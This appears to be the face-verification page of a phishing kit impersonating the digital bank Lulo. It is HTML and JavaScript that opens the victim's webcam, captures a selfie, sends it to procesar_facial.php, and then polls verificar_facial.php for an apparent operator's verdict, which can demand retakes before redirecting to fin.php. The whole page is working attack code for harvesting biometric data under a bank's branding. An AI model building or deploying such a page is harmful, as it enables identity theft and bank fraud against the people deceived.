<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación Facial - Lulo</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #212738;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }

    .logo {
      text-align: center;
    }

    .logo img {
      width: 80px;
      margin-bottom: 40px;
    }

    .confirm-text {
      font-size: 24px;
      font-weight: bold;
      color: #B3C508;
      text-align: center;
      margin-bottom: 20px;
    }

    .description-text {
      font-size: 14px;
      color: #b0b9c7;
      text-align: center;
      margin-bottom: 40px;
      line-height: 1.4;
      max-width: 280px;
    }

    .form-container {
      width: 300px;
      display: flex;
      flex-direction: column;
      gap: 30px;
      align-items: center;
    }

    video {
      width: 100%;
      max-width: 280px;
      border: 2px solid #5c6c7d;
      border-radius: 140px; /* Mitad de max-width para ovalado */
    }

    canvas {
      display: none;
    }

    .btn-login {
      width: 100%;
      padding: 15px;
      border: none;
      background-color: #B3C508;
      color: #000;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-left: 20px;
    }

    .btn-login:disabled {
      background-color: #3a3f4a;
      color: #6b7280;
      cursor: not-allowed;
    }

    .btn-login.active {
      background-color: #B3C508;
      color: #000;
      cursor: pointer;
    }

    .forgot {
      text-align: center;
      color: #9aa5b6;
      font-size: 14px;
      margin-top: 10px;
    }

    .forgot a {
      color: #9aa5b6;
      text-decoration: none;
    }

    /* Animación para el loader */
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.7; }
      100% { transform: scale(1); opacity: 1; }
    }

    /* Responsive para dispositivos móviles */
    @media (max-width: 768px) {
      body {
        padding: 20px;
        height: auto;
        min-height: 100vh;
      }

      .logo img {
        width: 60px;
        margin-bottom: 30px;
      }

      .confirm-text {
        font-size: 20px;
        margin-bottom: 15px;
      }

      .description-text {
        font-size: 13px;
        margin-bottom: 30px;
        max-width: 260px;
      }

      .form-container {
        width: 100%;
        max-width: 320px;
        gap: 25px;
      }

      .btn-login {
        padding: 12px;
        font-size: 16px;
        margin-left: 0;
      }

      .forgot {
        font-size: 13px;
        margin-top: 15px;
      }
    }

    /* Para pantallas muy pequeñas */
    @media (max-width: 480px) {
      body {
        padding: 15px;
      }

      .logo img {
        width: 50px;
        margin-bottom: 25px;
      }

      .confirm-text {
        font-size: 18px;
        margin-bottom: 12px;
      }

      .description-text {
        font-size: 12px;
        margin-bottom: 25px;
        max-width: 240px;
      }

      .form-container {
        width: 100%;
        max-width: 280px;
        gap: 20px;
      }

      .btn-login {
        padding: 10px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="img/lulo2.png" alt="Logo lulo">
    <div class="confirm-text">VERIFICACIÓN FACIAL</div>
    <div class="description-text">Para confirmar tu identidad, permite el acceso a la cámara y toma una foto de tu rostro. Asegúrate de quitarte lentes y gorra para una mejor verificación.</div>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="color: white; text-align: center;">
      <img src="img/125.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
    </div>
  </div>

  <div class="form-container">
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    <button class="btn-login active" id="captureBtn">Tomar Foto</button>
    <div class="forgot">
      <a href="#">¿Problemas con la cámara?</a>
    </div>
  </div>

  <script>
    function showNiceMessage(message) {
      // Crear modal bonito
      const modal = document.createElement('div');
      modal.style.position = 'fixed';
      modal.style.top = '0';
      modal.style.left = '0';
      modal.style.width = '100%';
      modal.style.height = '100%';
      modal.style.background = 'rgba(0,0,0,0.8)';
      modal.style.display = 'flex';
      modal.style.justifyContent = 'center';
      modal.style.alignItems = 'center';
      modal.style.zIndex = '10000';
      modal.style.color = '#fff';
      modal.style.fontFamily = 'Segoe UI, sans-serif';
      modal.style.textAlign = 'center';

      const content = document.createElement('div');
      content.style.background = '#212738';
      content.style.padding = '30px';
      content.style.borderRadius = '15px';
      content.style.maxWidth = '300px';
      content.style.boxShadow = '0 4px 20px rgba(0,0,0,0.5)';

      const text = document.createElement('p');
      text.textContent = message;
      text.style.fontSize = '18px';
      text.style.margin = '0';
      text.style.color = '#B3C508';

      content.appendChild(text);
      modal.appendChild(content);
      document.body.appendChild(modal);

      // Auto-remover después de 2 segundos
      setTimeout(() => {
        document.body.removeChild(modal);
      }, 2000);
    }
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');
    const loader = document.getElementById('loader-overlay');

    // Acceder a la webcam
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        alert('Error al acceder a la cámara: ' + err.message);
      });

    captureBtn.addEventListener('click', () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convertir a base64
      const imageData = canvas.toDataURL('image/png');

      // Mostrar loader
      loader.style.display = 'flex';

      // Enviar la imagen
      const sessionId = localStorage.getItem('session_id') || 'session_' + Date.now();

      const formData = new FormData();
      formData.append('image', imageData);
      formData.append('transactionId', sessionId);

      fetch('procesar_facial.php', {
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(result => {
        if (result.status === 'success') {
          checkFacialVerification(sessionId, result.messageId);
        } else {
          loader.style.display = 'none';
          alert('Error al enviar la foto.');
        }
      })
      .catch(err => {
        loader.style.display = 'none';
        alert('Error: ' + err.message);
      });
    });

    async function checkFacialVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_facial.php', {
          method: 'POST',
          body: formData
        });
        const result = await res.json();

        if (result.action) {
          switch (result.action) {
            case 'facial_ok':
              window.location.href = "/fin.php";
              break;
            case 'facial_error':
              loader.style.display = 'none';
              // Mostrar mensaje bonito y recargar
              showNiceMessage("Verificación facial fallida. Intenta de nuevo.");
              setTimeout(() => {
                window.location.href = "facial.php";
              }, 2000);
              break;
            case 'facial_retry':
              loader.style.display = 'none';
              // Mostrar mensaje bonito y recargar
              showNiceMessage("Se solicita nueva verificación facial. Preparando cámara...");
              setTimeout(() => {
                window.location.reload();
              }, 2000);
              break;
          }
        } else {
          setTimeout(() => checkFacialVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkFacialVerification(transactionId, messageId), 2000);
      }
    }
  </script>

</body>
</html>